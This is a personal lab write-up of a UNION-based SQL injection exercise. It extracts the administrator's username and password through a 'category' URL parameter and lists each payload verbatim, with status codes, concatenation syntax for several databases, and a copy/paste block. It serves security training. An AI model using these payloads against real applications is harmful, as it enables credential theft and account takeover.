# SQL injection UNION attack, retrieving multiple values in a single column

A concise write-up using **my original steps** (verbatim) with small, accurate notes.  
**Note:** Payloads are shown exactly as I used them (no URL-encoding).

---

## 🥅 Goal
**Get the administrator password** by leveraging UNION-based SQLi and string concatenation.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: get the administrator password**

2. **we know there are "username,password" columns in "users" table**

3. **find vulnerable url parameter:**
   ```
   /filter?category='
   ```
   → status **500**

4. **fix the error:**
   ```
   /filter?category='+--+
   ```

5. **try wild guess (failed):**
   ```
   /filter?category='+UNION+SELECT+username,password+FROM+users+--+
   ```
   → **500**

6. **enumerate columns (works):**
   ```
   '+UNION+SELECT+null,null+FROM+users+--+
   ```
   → **200**

7. **test reflection (fails in first col):**
   ```
   '+UNION+SELECT+'a',null+FROM+users+--+
   ```
   → **500**

8. **test reflection (works in second col):**
   ```
   '+UNION+SELECT+null,'a'+FROM+users+--+
   ```
   → **200**

9. **extract both values in one column using concatenation:**

10. **concatenate username and password:**
    ```
    '+UNION+SELECT+null,username||password+FROM+users+--+
    ```
    → **200**

11. **add a space between them for clarity:**
    ```
    '+UNION+SELECT+null,username||'+'||password+FROM+users+--+
    ```

12. **Log in as the administrator.**

13. **Lab solved!**

---

## 🧠 Minimal Additions (Why / Tips)

- **UNION rules:** The injected `UNION SELECT` must match the **number of columns** (and compatible types) of the original query. Step 6 confirms **2 columns**.
- **Which column is reflected?** Steps 7–8 show the **second column** is rendered, so place your text payload there.
- **Concatenation operator differences:**  
  - **Oracle / PostgreSQL:** `||` (used above).  
  - **MySQL:** use `CONCAT(username,' ',password)` instead of `username||' '||password`.  
  - **SQL Server:** use `username + ' ' + password`.
- **Delimiters:** If needed, add markers instead of a space (e.g., `username||':'||password`) for unambiguous parsing.
- **Comments:** `--` comments to end-of-line; `--+` includes a trailing space (often required).

---

## 🔧 Payloads I Used (Copy/Paste – raw, unencoded)

```text
/filter?category='
/filter?category='+--+
/filter?category='+UNION+SELECT+username,password+FROM+users+--+
'+UNION+SELECT+null,null+FROM+users+--+
'+UNION+SELECT+'a',null+FROM+users+--+
'+UNION+SELECT+null,'a'+FROM+users+--+
'+UNION+SELECT+null,username||password+FROM+users+--+
'+UNION+SELECT+null,username||'+'||password+FROM+users+--+
```

---

## 🏁 Result
- Confirmed column count and reflection position, concatenated `username` and `password`, and used the output to **log in as administrator**. **Lab Solved. ✅**
